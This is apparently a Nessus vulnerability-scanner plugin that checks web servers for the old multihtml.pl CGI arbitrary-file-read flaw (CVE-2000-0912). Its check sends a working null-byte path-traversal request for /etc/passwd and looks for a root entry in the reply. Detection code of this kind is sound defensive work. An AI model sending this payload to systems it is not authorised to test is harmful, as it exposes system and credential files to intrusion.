#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10516);
 script_bugtraq_id(6711);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2000-0912");
 name["english"] = "multihtml cgi";
 name["francais"] = "cgi multihtml";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'multihtml.pl' CGI is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary
files on the remote host.

Solution : remove 'multihtml.pl' from /cgi-bin.

Risk factor : High";


 desc["francais"] = "Le cgi 'multihtml.pl' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de lire
des fichiers arbitraires sur l'hote distant

Solution : retirez-le de /cgi-bin.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/multihtml.pl";
 summary["francais"] = "Vérifie la présence de /cgi-bin/multihtml.pl";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir, "/multihtml.pl?multi=/etc/passwd%00html");
 req = http_get(item:req, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if( buf == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf))security_hole(port);
}
